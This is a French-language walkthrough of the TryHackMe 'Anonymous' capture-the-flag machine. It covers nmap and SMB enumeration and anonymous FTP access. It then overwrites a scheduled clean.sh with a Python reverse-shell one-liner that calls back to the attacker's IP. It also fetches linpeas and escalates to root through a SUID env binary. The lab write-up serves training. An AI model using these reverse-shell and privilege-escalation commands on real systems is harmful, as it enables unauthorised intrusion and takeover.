Anonymous est une machine medium sur tryhackme,qui est plutot guidée au niveau des instructions
commencons par un scan nmap 
objectif : trouver quels services tournent sur la machine.
#  1:Scan NMAP
nmap -A -p- -oN nmapscan.txt 10.10.248.163
-A : détection de version + os
-p- : scan tous les ports de 1 jusqua je sais plus combien
-oN : on garde une copie du scan(optionel)
résultat :
port 21 : ftp (service de transfert de fichiers)
por 22 : ssh (accès distant )
ports 139/445 : smb (partages réseau windows)

# 2 enumeration smb
objectif : voir si smb donne accès à des dossiers/fichiers ou utilisateurs.

outil utilisé : enum4linux
enum4linux 10.10.248.163
résultat :
utilisateur trouvé : namelessone
partage réseau trouvé : pics
un test de connection peut etre effectué mais la on en a pâs besoin sur cedtte machine,comme des cve presents mais ici on ne nous demande pas de les utiliser

# 3: FTP
alors dans le scan nmap on a vu que on pouvais se co en tant qu'Anonymous au FTP,ce qui est generalement très utile,surtout dans les ctf

# objectif : voir si le ftp cache des choses

commande utilisée : ftp 10.10.248.163
puis on rentre le nom d'utilisateur anonymous et en mot de passe,on appuie sur entrée
on fait ls puis on repere un dossier scripts
cd scripts
ls
on y trouve 3 fichiers : 
clean.sh : script bash exécutable

to_do.txt : un fichier texte qui dit "je dois désactiver le login ftp anonyme,ce n'est vraiment pas securisé",bon pas grand chose mais ca nous dit deja que le ftp anonymous va beacuoup nous servir

removed_files.log : un log des fichiers supprimés
Ensuite,on telecharge clean.sh pour l'analyser
get clean.sh
il contient un script bash qui nettoie les fichiers temporaires,surement executé une fois toutes les ? minutes mais ca on ne sait pas
si on le modifie, on peut faire exécuter nos propre ligne de commandes en bash
# Reverse shell
1:on modifie clean.sh avec nano ici mais faisable avec tout autre editeur de texte,puis on rentre un script python qui va nous permettre d'avoir un reverse shell sur la machine ciblr

#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ton adressseip",2121));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

2:upload le shell
put clean.sh
3: tu ouvre un listener netcat sur ton port
nc -lvnp 2121
après quelques minutes,on a un reverse shell ! 
il est fragile et le but ici est de le stabiliser,alors on peut utiliser ce script python
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
une fois qu'on a un reverse shell stable,on peut aller dans .ssh et changer la clé si on veut etre co en ssh moi je men fou donc bon on peut rester ici

# escalation de privilèges

je host un serveur avec python sur ma machine et recupere linpeas.sh avec wget(linpeas est un outil automatique pour du privesc)
alors apres je rend linpeas executable
chmod +x linpeas.sh
puis ./linpeas.sh
je vois le fichier en rouge
/usr/bin/env
après j'utilise env/bin/sh -p
puis je fais whoami et je suis root
alors je recupere root txt et cest fini! 











